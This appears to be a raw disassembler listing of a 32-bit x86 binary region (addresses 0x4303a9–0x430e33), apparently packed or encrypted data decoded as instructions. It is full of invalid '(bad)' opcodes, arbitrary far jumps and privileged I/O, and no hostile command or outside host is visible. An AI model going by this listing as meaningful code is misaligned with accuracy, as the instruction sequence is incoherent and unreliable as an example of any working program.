  4303a9:	jnp    0x43035b
  4303ab:	not    BYTE PTR [eax+0x63b7f275]
  4303b1:	or     dl,al
  4303b3:	and    edi,DWORD PTR [ebx*2-0x64a6e33a]
  4303ba:	sub    ah,BYTE PTR [ebx+0x1c]
  4303bd:	ret    
  4303be:	lea    ecx,[esi+0x6e]
	...
  430434:	aaa    
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfd00:0xfeba642b
  430446:	add    DWORD PTR [eax],eax
  430448:	cmc    
  430449:	add    BYTE PTR [eax],al
  43044b:	add    BYTE PTR [edx],ah
  43044d:	mov    esi,0x5e5f250e
  430452:	ins    DWORD PTR es:[edi],dx
  430453:	add    eax,0x82b375ee
  430458:	test   eax,0xc077aa4f
  43045d:	mov    eax,ds:0xc477ce48
  430462:	lock cld 
  430464:	mov    ch,0x5c
  430466:	mov    al,ah
  430468:	pop    eax
  430469:	sbb    edi,edx
  43046b:	dec    ebx
  43046c:	mov    ah,0xf8
  43046e:	call   0xbf3b1e9d
  430473:	dec    esp
  430474:	and    DWORD PTR [edx+0x51],edi
  430477:	add    al,0x62
  430479:	sahf   
  43047a:	push   es
  43047b:	xchg   esi,eax
  43047c:	push   esi
  43047d:	add    DWORD PTR [ecx],ebp
  43047f:	outs   dx,BYTE PTR ds:[esi]
  430480:	mov    edi,0xedbaa7b2
  430485:	push   0xd583169a
  43048a:	cmp    BYTE PTR [eax-0x11],0x27
  43048e:	or     al,0x4d
  430490:	mov    esp,0xeb7f4e13
  430495:	mov    bh,BYTE PTR [ecx+0x17887593]
  43049b:	adc    DWORD PTR [ecx+esi*1-0xd9aebc5],eax
  4304a2:	mov    ?,WORD PTR [edi]
  4304a4:	cmp    bl,BYTE PTR [ebx-0x1a]
  4304a7:	inc    ebp
  4304a8:	pusha  
  4304a9:	cmc    
  4304aa:	or     al,0x42
  4304ac:	(bad)  
  4304ad:	ins    BYTE PTR es:[edi],dx
  4304ae:	lods   eax,DWORD PTR ds:[esi]
  4304af:	mov    ah,0x3f
  4304b1:	retf   0x133c
  4304b4:	mov    cl,BYTE PTR [edx-0x13]
  4304b7:	sbb    al,0x8c
  4304b9:	push   ebp
  4304ba:	cmp    al,0xd9
  4304bc:	out    0x6,eax
  4304be:	xbegin 0x150c843a
  4304c4:	loopne 0x430513
  4304c6:	pop    ecx
  4304c7:	inc    eax
  4304c8:	in     eax,dx
  4304c9:	adc    DWORD PTR [edx],esp
  4304cb:	fwait
  4304cc:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4304ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4304cf:	ins    DWORD PTR es:[edi],dx
  4304d0:	mov    ah,0xaf
  4304d2:	(bad)  
  4304d3:	push   es
  4304d4:	pusha  
  4304d5:	sti    
  4304d6:	(bad)  
  4304d7:	inc    BYTE PTR [edi]
  4304d9:	ret    0xa5e0
  4304dc:	and    BYTE PTR [ecx+0x3b1904e4],bh
  4304e2:	inc    ebx
  4304e3:	xchg   ebx,eax
  4304e4:	jno    0x4304eb
  4304e6:	test   eax,0x1f69bc9f
  4304eb:	fwait
  4304ec:	sbb    cl,BYTE PTR [edx+0x7356ad9d]
  4304f2:	rol    DWORD PTR [edi+esi*4-0x69],cl
  4304f6:	mov    edx,0x94e739bd
  4304fb:	and    ebp,DWORD PTR [esi+0x68756b1e]
  430501:	outs   dx,DWORD PTR ds:[esi]
  430502:	stos   BYTE PTR es:[edi],al
  430503:	int    0x88
  430505:	retf   
  430506:	(bad)  
  430508:	adc    esp,DWORD PTR [ebx+0x15]
  43050b:	daa    
  43050c:	xchg   esp,eax
  43050d:	push   ds
  43050e:	push   edi
  43050f:	push   esp
  430510:	or     BYTE PTR [edx-0x6c2ff884],al
  430516:	sbb    ah,BYTE PTR [ebx-0x4e]
  430519:	cmc    
  43051a:	arpl   WORD PTR [eax+0x36d17706],bp
  430520:	stos   DWORD PTR es:[edi],eax
  430521:	cld    
  430522:	jecxz  0x43057f
  430524:	inc    esi
  430525:	jmp    0xdc99:0x826f50d8
  43052c:	mov    eax,0xd69e3795
  430531:	push   cs
  430532:	mov    eax,ds:0x9080f984
  430537:	xchg   DWORD PTR [esi],edx
  430539:	std    
  43053a:	push   cs
  43053b:	and    al,0x21
  43053d:	es jb  0x430636
	...
  4305b4:	ds push esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi+0x4c]
  4305c1:	push   ss
  4305c2:	mov    DWORD PTR [edx+0x1fdf5],ebx
  4305c8:	cmc    
  4305c9:	add    BYTE PTR [eax],al
  4305cb:	add    BYTE PTR [esi+edx*2-0x640e9d84],bl
  4305d2:	add    ebp,ecx
  4305d4:	xchg   edx,eax
  4305d5:	add    ebx,DWORD PTR [eax+0x6c03044a]
  4305db:	add    bh,BYTE PTR [eax+0x34]
  4305de:	je     0x4305dd
  4305e0:	mov    dh,0xbe
  4305e2:	adc    esp,esp
  4305e4:	push   ss
  4305e5:	push   edi
  4305e6:	push   cs
  4305e7:	(bad)  
  4305e8:	adc    eax,0xe4ec8308
  4305ed:	(bad)  [ebp+0x22]
  4305f0:	aaa    
  4305f1:	inc    edx
  4305f2:	jae    0x4305e9
  4305f4:	out    0xd0,al
  4305f6:	sub    eax,0x24f26d82
  4305fb:	jle    0x4305cc
  4305fd:	inc    eax
  4305fe:	fdivr  st,st(7)
  430600:	inc    eax
  430601:	fsub   st(7),st
  430603:	retf   0x6ad1
  430606:	xchg   edx,eax
  430607:	mov    ah,0x82
  430609:	int3   
  43060a:	shr    BYTE PTR [esi+eiz*8+0x7245a0c0],0x3c
  430612:	fs std 
  430614:	dec    esi
  430615:	out    dx,eax
  430616:	gs xchg edi,eax
  430618:	lods   al,BYTE PTR ds:[esi]
  430619:	inc    esp
  43061a:	clc    
  43061b:	popf   
  43061c:	sbb    ebx,DWORD PTR [ebp-0x7a]
  43061f:	ret    
  430620:	jge    0x43068a
  430622:	xor    dh,BYTE PTR [ebx+0x325030d3]
  430628:	in     al,0x2f
  43062a:	loop   0x430694
  43062c:	jmp    0x4305b3
  43062e:	fisubr DWORD PTR [edi-0x5c]
  430631:	jmp    0x322e62b9
  430636:	dec    edx
  430637:	push   edi
  430639:	ffreep st(4)
  43063b:	xchg   BYTE PTR [eax+0x1b],bh
  43063e:	sbb    edx,DWORD PTR [edi+0x6bfdda3f]
  430644:	mov    ch,0xe2
  430646:	repnz fdivr st(3),st
  430649:	shl    BYTE PTR [eax-0x34],cl
  43064c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43064d:	sub    ch,0x53
  430650:	and    BYTE PTR [eax+0x476d1f96],dh
  430656:	mov    BYTE PTR [esi],cl
  430658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430659:	push   es
  43065a:	xor    esi,esp
  43065c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43065d:	leave  
  43065e:	push   ebx
  43065f:	mov    al,BYTE PTR [eax]
  430661:	mov    al,ds:0x7eb1d32d
  430666:	into   
  430667:	adc    ch,ah
  430669:	aas    
  43066a:	jecxz  0x4306aa
  43066c:	mov    dl,BYTE PTR [ebp-0x6d29aa1e]
  430672:	xchg   edi,eax
  430673:	retw   0xc386
  430677:	pop    ebx
  430678:	cmp    al,0x74
  43067a:	in     eax,dx
  43067b:	hlt    
  43067c:	(bad)  
  43067d:	(bad)  
  43067e:	xlat   BYTE PTR ds:[ebx]
  43067f:	jl     0x430637
  430681:	mov    bh,0x11
  430683:	sbb    edi,DWORD PTR [di+0x58]
  430687:	add    ch,BYTE PTR [ebp-0xd]
  43068a:	pop    ss
  43068b:	pop    ebp
  43068c:	jnp    0x430626
  43068e:	push   0x57247127
  430693:	icebp  
  430694:	ja     0x4306d5
  430696:	push   esi
  430697:	jmp    FWORD PTR [ebx]
  430699:	std    
  43069a:	ins    BYTE PTR es:[edi],dx
  43069b:	jmp    0x430621
  43069d:	sbb    eax,0xd297c3df
  4306a2:	pmulhuw mm1,mm2
  4306a5:	dec    esi
  4306a6:	or     al,0xc8
  4306a8:	adc    ah,BYTE PTR [edx+0x52bf1c46]
  4306ae:	inc    ebx
  4306af:	ja     0x43071a
  4306b1:	clc    
  4306b2:	outs   dx,BYTE PTR ds:[si]
  4306b4:	call   0x3176:0xe5f0b563
  4306bb:	push   ss
  4306bc:	in     al,dx
  4306bd:	or     DWORD PTR [edi],ebx
  4306bf:	or     eax,0x69
	...
  430734:	jno    0x4306d7
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0xdc
  430741:	ja     0x4307ba
  430743:	aam    0xea
  430745:	inc    BYTE PTR [ecx]
  430747:	add    ch,dh
  430749:	add    BYTE PTR [eax],al
  43074b:	add    BYTE PTR [ebx],cl
  43074d:	int    0x4a
  43074f:	push   0x3f
  430751:	pop    ebp
  430752:	xor    al,0xe5
  430754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430755:	and    DWORD PTR ds:0xdaca64da,ebx
  43075b:	shr    BYTE PTR [eax+ebx*1+0x71],cl
  43075f:	or     ch,BYTE PTR [ebx+0x11]
  430762:	ins    DWORD PTR es:[edi],dx
  430763:	int3   
  430764:	xchg   esp,esi
  430766:	xor    al,0xf1
  430768:	fbstp  TBYTE PTR [ecx]
  43076a:	jmp    0x430785
  43076c:	pop    ds
  43076d:	rcr    DWORD PTR [ecx+0x43c14bb4],1
  430773:	(bad)  
  430774:	ss sub eax,0x129a5395
  43077a:	lds    ebp,FWORD PTR [esi-0x6da2772b]
  430780:	ret    0x47fe
  430783:	ret    0x7e00
  430786:	scas   al,BYTE PTR es:[edi]
  430787:	xchg   edi,eax
  430788:	dec    ebx
  430789:	jecxz  0x43076a
  43078b:	bound  edi,QWORD PTR [edi]
  43078d:	inc    ebp
  43078e:	push   es
  43078f:	pushf  
  430790:	test   DWORD PTR [esi+0x48ebc87],edx
  430796:	push   ebp
  430797:	test   al,0xda
  430799:	outs   dx,BYTE PTR ds:[esi]
  43079a:	aas    
  43079b:	push   esp
  43079c:	aaa    
  43079d:	pop    esp
  43079e:	jbe    0x43073d
  4307a0:	cmp    al,BYTE PTR [esi+ebx*8+0x6f]
  4307a4:	fxch   st(6)
  4307a6:	mov    edi,0x696a5ee6
  4307ab:	adc    BYTE PTR [ecx],dl
  4307ad:	lods   al,BYTE PTR ds:[esi]
  4307ae:	std    
  4307af:	cwde   
  4307b0:	es dec edi
  4307b2:	mov    BYTE PTR [ecx+0x72],al
  4307b5:	or     eax,edi
  4307b7:	cwde   
  4307b8:	fucomip st,st(5)
  4307ba:	add    dh,BYTE PTR [esi-0x4]
  4307bd:	retf   0x5e08
  4307c0:	pop    edi
  4307c1:	fwait
  4307c2:	pop    eax
  4307c3:	lahf   
  4307c4:	iret   
  4307c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4307c6:	mov    ecx,0xe673b5be
  4307cb:	(bad)  
  4307cc:	xchg   edx,eax
  4307cd:	xchg   esi,eax
  4307ce:	aad    0xff
  4307d0:	pop    ebx
  4307d1:	inc    edi
  4307d2:	push   cs
  4307d3:	fsubr  DWORD PTR [edx+0x4ba7b74a]
  4307d9:	and    BYTE PTR [edi+0x1c],ch
  4307dc:	stc    
  4307dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4307de:	and    esp,DWORD PTR [ebx+edx*2]
  4307e1:	cmp    ecx,DWORD PTR ds:0xc44f0df3
  4307e7:	pop    esp
  4307e8:	pop    ds
  4307e9:	adc    al,0x7a
  4307eb:	ret    0xc936
  4307ee:	outs   dx,DWORD PTR ds:[esi]
  4307ef:	fild   QWORD PTR [esi+0x6f3fc32f]
  4307f5:	inc    edi
  4307f6:	jae    0x430790
  4307f8:	add    dh,bh
  4307fa:	push   es
  4307fb:	xchg   esp,eax
  4307fc:	pop    ebp
  4307fd:	jl     0x43080c
  4307ff:	adc    al,0x27
  430801:	jno    0x4307a2
  430803:	mov    ds:0x2df20635,eax
  430808:	cmp    DWORD PTR [edi+0x7aa93bf2],edx
  43080e:	and    DWORD PTR [edx],esi
  430810:	jmp    0x4307e1
  430812:	add    eax,0x42180f0a
  430817:	or     edx,0x9b4816e5
  43081d:	(bad)  
  43081f:	mov    ebp,0x8c4330b6
  430824:	jno    0x43084b
  430826:	and    DWORD PTR [edx-0x18a2905a],edi
  43082c:	clc    
  43082d:	pop    ecx
  43082e:	xchg   edi,eax
  43082f:	adc    al,0x46
  430831:	iret   
  430832:	hlt    
  430833:	cmp    al,0xec
  430835:	push   edi
  430836:	push   ebx
  430837:	push   ds
  430838:	inc    esp
  430839:	jb     0x43087d
  43083b:	or     dh,bl
  43083d:	lods   eax,DWORD PTR ds:[esi]
  43083e:	push   ecx
  43083f:	das    
  430840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4308b1:	add    BYTE PTR [eax],al
  4308b3:	add    BYTE PTR [esp+esi*2],dl
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	or     BYTE PTR [edi-0x2062e5],bl
  4308c6:	add    DWORD PTR [eax],eax
  4308c8:	cmc    
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    bl,al
  4308cd:	fidivr WORD PTR [edx+0x76]
  4308d0:	jns    0x4308cd
  4308d2:	int3   
  4308d3:	iret   
  4308d4:	dec    esp
  4308d5:	out    0xa7,al
  4308d7:	stc    
  4308d8:	fwait
  4308d9:	add    DWORD PTR [edx+0x1d483a20],0xa6c61cc2
  4308e3:	jne    0x4308bc
  4308e5:	lods   al,BYTE PTR ds:[esi]
  4308e6:	xchg   ebx,eax
  4308e7:	sub    al,0x98
  4308e9:	add    BYTE PTR ds:0x6c51e54a,bl
  4308ef:	sub    al,0xd6
  4308f1:	mov    ebp,DWORD PTR [edx-0x1a]
  4308f4:	fcom   QWORD PTR [edi*2+0x4ec3de0a]
  4308fb:	loope  0x43093b
  4308fd:	(bad)  
  4308fe:	xor    DWORD PTR [esi],edi
  430900:	jl     0x430892
  430902:	ret    
  430903:	leave  
  430904:	push   ecx
  430905:	out    0xe4,al
  430907:	xchg   esp,eax
  430908:	sahf   
  430909:	stc    
  43090a:	ins    DWORD PTR es:[edi],dx
  43090b:	push   0x5f
  43090d:	jb     0x43098d
  43090f:	push   cs
  430910:	(bad)  
  430911:	ret    0xc70a
  430914:	jp     0x4308e7
  430916:	push   esp
  430917:	push   ebp
  430918:	mov    cl,0xe6
  43091a:	sbb    al,0x8
  43091c:	adc    esp,DWORD PTR [ecx+0x1d]
  43091f:	sub    edx,DWORD PTR [edi+0x49]
  430922:	bound  edx,QWORD PTR gs:[edx+0x71d65b30]
  430929:	push   ecx
  43092a:	js     0x430987
  43092c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43092d:	sub    BYTE PTR [esi],ah
  43092f:	ins    BYTE PTR es:[edi],dx
  430930:	push   ss
  430931:	shr    DWORD PTR [edi-0x6c712716],cl
  430937:	mov    ebx,0x1adafcb1
  43093c:	jnp    0x43090a
  43093e:	neg    DWORD PTR [edx+0x75470ded]
  430944:	stos   BYTE PTR es:[edi],al
  430945:	in     eax,0x6e
  430947:	das    
  430948:	add    dl,BYTE PTR [esp+ebx*1-0x258875d1]
  43094f:	xchg   esi,eax
  430950:	cld    
  430951:	dec    edi
  430952:	sti    
  430953:	pop    ss
  430954:	enter  0x9f9a,0x97
  430958:	push   ecx
  430959:	adc    eax,0xe1c124f8
  43095e:	inc    edi
  43095f:	sbb    DWORD PTR [edi],0xffffffab
  430962:	aam    0xb0
  430964:	not    DWORD PTR [ebp-0x7aeb9536]
  43096a:	int3   
  43096b:	ins    DWORD PTR es:[edi],dx
  43096c:	ins    DWORD PTR es:[edi],dx
  43096d:	out    dx,eax
  43096e:	shl    DWORD PTR [eax+ebp*4],cl
  430971:	mov    edi,0x50ad85da
  430976:	scas   eax,DWORD PTR es:[edi]
  430977:	inc    BYTE PTR [esi]
  430979:	sub    al,0xc
  43097b:	fisttp QWORD PTR [ecx-0x72823f56]
  430981:	pop    ebx
  430982:	out    0x9,eax
  430984:	sbb    al,0x92
  430986:	fdiv   QWORD PTR [esp+ecx*4+0x22e200c2]
  43098d:	xchg   ebp,eax
  43098e:	and    al,0x91
  430990:	loopne 0x430973
  430992:	and    al,0x4a
  430994:	mov    ch,0x86
  430996:	jns    0x430945
  430998:	(bad)  
  430999:	xor    dl,cl
  43099b:	test   al,0x89
  43099d:	push   edi
  43099e:	xchg   ebp,eax
  43099f:	mov    esi,0x828d988b
  4309a4:	jl     0x430a18
  4309a6:	mov    bl,0x16
  4309a8:	mov    edx,0x1939f24c
  4309ad:	test   DWORD PTR [ecx+0x58],0x879d40c2
  4309b4:	push   0x666cf90a
  4309b9:	and    edx,ecx
  4309bb:	cmp    eax,0xb2fc5e4e
  4309c0:	xor    al,0x0
	...
  430a32:	add    BYTE PTR [eax],al
  430a34:	sbb    ebp,edi
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0x2a71d837
  430a43:	mov    ds:0x200d4,eax
  430a48:	cmc    
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    bl,ah
  430a4d:	mov    WORD PTR [esi],es
  430a4f:	mov    al,0x38
  430a51:	xchg   ebp,eax
  430a52:	das    
  430a53:	popf   
  430a54:	mov    dh,0x3e
  430a56:	das    
  430a57:	adc    al,0x7e
  430a59:	cmp    cl,dl
  430a5b:	imul   ebp,DWORD PTR ds:0x96aa1f92,0x5bb83ce1
  430a65:	pop    ebp
  430a66:	xlat   BYTE PTR ds:[ebx]
  430a67:	dec    ecx
  430a68:	cwde   
  430a69:	adc    eax,0xe22cfcb0
  430a6e:	rol    DWORD PTR [esi+0x6bc58cf7],0xca
  430a75:	or     al,BYTE PTR [ebx-0x75]
  430a78:	mov    ecx,0x8e5664e7
  430a7d:	test   DWORD PTR [edx],esp
  430a7f:	dec    eax
  430a80:	mov    ecx,0x5251b505
  430a85:	dec    esi
  430a86:	mov    ebp,0x8143ff37
  430a8b:	out    dx,eax
  430a8c:	or     esp,DWORD PTR [ebp+0x663fa7e9]
  430a92:	nop
  430a93:	push   ss
  430a94:	mov    edi,0xa2d383dd
  430a99:	loopne 0x430a28
  430a9b:	or     edx,ebx
  430a9d:	lahf   
  430a9e:	sti    
  430a9f:	adc    eax,0xb982cc9c
  430aa4:	shr    DWORD PTR [edi+0x40],0x12
  430aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430aa9:	inc    eax
  430aaa:	cwde   
  430aab:	es jl  0x430af3
  430aae:	xor    ecx,DWORD PTR [esi+0xfb7ec20]
  430ab4:	gs dec edi
  430ab6:	cmovae eax,DWORD PTR [eax+0x5a]
  430aba:	and    ecx,ecx
  430abc:	push   es
  430abd:	pop    ebx
  430abe:	cmp    al,0x8
  430ac0:	jno    0x430ae6
  430ac2:	in     eax,dx
  430ac3:	sahf   
  430ac4:	xchg   esp,eax
  430ac5:	(bad)
  430ac9:	cmp    al,0xdb
  430acb:	mov    ebp,0xa5585b79
  430ad0:	fcmovnu st,st(1)
  430ad2:	adc    eax,0xb9ceb6
  430ad7:	xor    bl,0xa8
  430ada:	inc    ebx
  430adb:	(bad)  
  430adc:	or     BYTE PTR [edx-0x54d04537],al
  430ae2:	adc    dh,BYTE PTR [edi-0x6]
  430ae5:	(bad)  
  430ae6:	cs mov gs:0xea3952a2,eax
  430aed:	repz js 0x430b45
  430af0:	inc    edi
  430af1:	stc    
  430af2:	push   es
  430af3:	sbb    eax,0xa9fcc0ea
  430af8:	push   eax
  430af9:	adc    cl,dh
  430afb:	popa   
  430afc:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  430afe:	sub    al,BYTE PTR [ecx+eax*8-0x10]
  430b02:	ficom  DWORD PTR [ebx]
  430b04:	je     0x430b02
  430b06:	inc    esi
  430b07:	xlat   BYTE PTR ds:[ebx]
  430b08:	int3   
  430b09:	iret   
  430b0a:	push   es
  430b0b:	mov    ds:0xbd4de7aa,al
  430b10:	daa    
  430b11:	bound  ebp,QWORD PTR [ebp-0x23]
  430b14:	sub    al,0xca
  430b16:	pop    ss
  430b17:	sets   BYTE PTR [esi+0x36]
  430b1b:	nop
  430b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430b1d:	outs   dx,DWORD PTR ds:[esi]
  430b1e:	int3   
  430b1f:	ds je  0x430b2b
  430b22:	dec    edi
  430b23:	sub    ah,BYTE PTR ds:0x6d682a33
  430b29:	dec    edi
  430b2a:	or     BYTE PTR [edi-0x1d],ch
  430b2d:	outs   dx,DWORD PTR ds:[esi]
  430b2e:	ret    0x8c2e
  430b31:	or     edi,ecx
  430b33:	test   BYTE PTR [eax],0x60
  430b36:	pop    eax
  430b37:	inc    ecx
  430b38:	fs xchg ebx,eax
  430b3a:	cmc    
  430b3b:	jns    0x430af1
  430b3d:	clc    
  430b3e:	pop    edi
  430b3f:	fucomp st(1)
	...
  430bb1:	add    BYTE PTR [eax],al
  430bb3:	add    BYTE PTR [ebx],cl
  430bb5:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  430bbb:	call   0x60c6:0x3f4217e6
  430bc2:	stos   DWORD PTR es:[edi],eax
  430bc3:	jae    0x430b8e
  430bc5:	add    DWORD PTR [edx],eax
  430bc7:	add    ch,dh
  430bc9:	add    BYTE PTR [eax],al
  430bcb:	add    BYTE PTR [eax+0x7f38637f],bh
  430bd1:	cmp    eax,0x936d6277
  430bd6:	xchg   esi,eax
  430bd7:	ret    0xa6b4
  430bda:	xor    BYTE PTR [ebp+0x1adc561e],cl
  430be0:	call   0x292ffcaf
  430be5:	daa    
  430be6:	push   ss
  430be7:	imul   ebx
  430be9:	test   eax,0xc506d6f5
  430bee:	clc    
  430bef:	out    dx,al
  430bf0:	mov    es,WORD PTR [ebp-0x3]
  430bf3:	jo     0x430bf3
  430bf5:	retf   
  430bf6:	sub    esi,eax
  430bf8:	add    eax,0x7e3d59d8
  430bfd:	leave  
  430bfe:	(bad)  
  430bff:	push   eax
  430c00:	ror    DWORD PTR [ebp+eax*8-0xcff1d9e],1
  430c07:	cmp    DWORD PTR [esi],eax
  430c09:	pushf  
  430c0a:	in     eax,dx
  430c0b:	repnz mov ebp,0xaa97fe64
  430c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430c12:	sbb    al,0x13
  430c14:	add    eax,0x296c9e12
  430c19:	jae    0x430c3a
  430c1b:	inc    edx
  430c1c:	and    ecx,ebp
  430c1e:	inc    edx
  430c1f:	cdq    
  430c20:	xor    DWORD PTR [ecx],ebx
  430c22:	cwde   
  430c23:	pop    esi
  430c24:	sub    edi,0xffffffa8
  430c27:	fld    DWORD PTR [edx+0x51e0c8b4]
  430c2d:	mov    BYTE PTR [esi+esi*1],bl
  430c30:	add    esp,DWORD PTR [edi-0x7]
  430c33:	aad    0xc
  430c35:	xchg   edi,eax
  430c36:	mov    ebx,0x96fbc595
  430c3b:	lea    eax,[ebp+0x760de309]
  430c41:	int    0x54
  430c43:	std    
  430c44:	test   DWORD PTR [edx],0x3a60e575
  430c4a:	ins    DWORD PTR es:[edi],dx
  430c4b:	dec    edx
  430c4c:	fnstsw WORD PTR cs:[esi-0x7a]
  430c50:	cmp    eax,0xf1d789e6
  430c55:	add    al,0x6e
  430c57:	jl     0x430cac
  430c59:	inc    esi
  430c5a:	jbe    0x430bfa
  430c5c:	ins    DWORD PTR es:[edi],dx
  430c5d:	cmp    DWORD PTR [esi-0x7b],ecx
  430c60:	ficomp WORD PTR [edx]
  430c62:	sub    DWORD PTR [ecx-0x74],edx
  430c65:	inc    ebp
  430c66:	pop    ecx
  430c67:	pushf  
  430c68:	mov    esp,0xdf2645c5
  430c6d:	out    dx,eax
  430c6e:	jle    0x430c82
  430c70:	sar    DWORD PTR [ecx],1
  430c72:	mov    esi,0xef5b025d
  430c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c78:	ret    
  430c79:	cdq    
  430c7a:	xlat   BYTE PTR ds:[ebx]
  430c7b:	sbb    ebp,DWORD PTR [edx+eax*1-0x5f55327a]
  430c82:	call   DWORD PTR [esi-0x37]
  430c85:	repz cli 
  430c87:	fcmovbe st,st(7)
  430c89:	sbb    eax,0x8b9bdfe
  430c8e:	sar    esp,0xf9
  430c91:	dec    ebp
  430c92:	popf   
  430c93:	mov    DWORD PTR [ebx-0x157c0574],edi
  430c99:	call   0xcb81bad0
  430c9e:	mov    ds:0xf9ae5fa5,al
  430ca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430ca4:	jne    0x430d24
  430ca6:	imul   ebp,DWORD PTR [esp+edx*2],0xffffffe8
  430caa:	mov    eax,eax
  430cac:	or     eax,0x66eb1852
  430cb1:	sbb    eax,0x2593dbb5
  430cb6:	xchg   edi,eax
  430cb7:	push   0x51
  430cb9:	inc    ebp
  430cba:	mov    esp,0x3da950de
  430cbf:	push   cs
  430cc0:	mov    eax,ds:0x0
	...
  430d31:	add    BYTE PTR [eax],al
  430d33:	add    BYTE PTR [eax-0x40],cl
  430d36:	ret    0xcaf0
  430d39:	bnd jp 0x430d34
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430d95
  430d41:	mov    BYTE PTR [ecx+0x202be67],bh
  430d47:	add    ch,dh
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    BYTE PTR [edi+0x38d909b8],ah
  430d51:	xchg   edi,eax
  430d52:	inc    edx
  430d53:	fsub   st(0),st
  430d55:	rcl    DWORD PTR cs:[ebx],cl
  430d58:	enter  0xbbe4,0x0
  430d5c:	mov    dl,0xa
  430d5e:	push   0xffffff91
  430d60:	lods   eax,DWORD PTR ds:[esi]
  430d61:	cwde   
  430d62:	scas   al,BYTE PTR es:[edi]
  430d63:	hlt    
  430d64:	inc    esi
  430d65:	fldenv [edx+0x26763b93]
  430d6c:	in     al,dx
  430d6d:	and    eax,0x35292d42
  430d72:	cmp    DWORD PTR [esi+0x36],ecx
  430d75:	pop    esp
  430d76:	push   edi
  430d77:	mov    al,ds:0xaab60f49
  430d7c:	inc    ebp
  430d7d:	es pop ds
  430d7f:	mov    WORD PTR es:[ebx-0x17],fs
  430d83:	add    eax,0xf8e24994
  430d88:	popf   
  430d89:	lods   eax,DWORD PTR ds:[esi]
  430d8a:	rcl    ah,cl
  430d8c:	test   al,0xb5
  430d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d8f:	sbb    ebp,DWORD PTR [edx]
  430d91:	mov    cl,0x93
  430d93:	out    0x1c,al
  430d95:	xor    esp,DWORD PTR [ecx-0xc]
  430d98:	out    0x27,eax
  430d9a:	push   esp
  430d9b:	pop    ss
  430d9c:	ins    DWORD PTR es:[edi],dx
  430d9d:	mov    cl,0xcf
  430d9f:	pop    esp
  430da0:	mov    esi,0xa0c32a
  430da5:	sbb    al,0x1
  430da7:	inc    esi
  430da8:	mov    dh,0x2e
  430daa:	ja     0x430de8
  430dac:	ds pop ds
  430dae:	and    BYTE PTR [edx-0x4f],cl
  430db1:	add    al,0x21
  430db3:	jmp    0x90b9:0x713f4a9
  430dba:	mov    edx,DWORD PTR [ebx-0x6979c404]
  430dc0:	pop    ecx
  430dc1:	jl     0x430e0d
  430dc3:	cs int3 
  430dc5:	cld    
  430dc6:	pop    ss
  430dc7:	xchg   ebx,eax
  430dc8:	test   BYTE PTR [esi],al
  430dca:	fs stos DWORD PTR es:[edi],eax
  430dcc:	pop    esp
  430dcd:	ret    0x5372
  430dd0:	fstp   DWORD PTR [ebp+ecx*8+0x9]
  430dd4:	xor    al,0xc2
  430dd6:	jecxz  0x430dfb
  430dd8:	sbb    eax,0x2311a4b9
  430ddd:	dec    esi
  430dde:	xor    ax,0x85e1
  430de2:	leave  
  430de3:	push   ds
  430de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430de5:	or     DWORD PTR [edi],ebx
  430de7:	sbb    eax,0x520064de
  430dec:	ja     0x430ded
  430dee:	imul   edx,DWORD PTR [eax+0x3d],0x9281542e
  430df5:	cwde   
  430df6:	int    0xee
  430df8:	test   edx,edx
  430dfa:	std    
  430dfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430dfc:	lea    ebp,[edx+0x3d17f2a2]
  430e02:	loopne 0x430e66
  430e04:	add    BYTE PTR [eax],ah
  430e06:	lock retf 0x2f53
  430e0a:	or     bh,BYTE PTR [ecx+0x8]
  430e0d:	inc    dh
  430e0f:	xor    eax,0xb4fc48b0
  430e14:	fistp  DWORD PTR [ecx]
  430e16:	sub    eax,0x4f1b1079
  430e1b:	add    BYTE PTR ds:0x348149df,0x6
  430e22:	ret    
  430e23:	das    
  430e24:	pusha  
  430e25:	fs xor bh,ah
  430e28:	inc    esp
  430e29:	jnp    0x430e02
  430e2b:	fwait
  430e2c:	aas    
  430e2d:	sbb    eax,0x5106e1be
  430e32:	cmc    
  430e33:	cld    
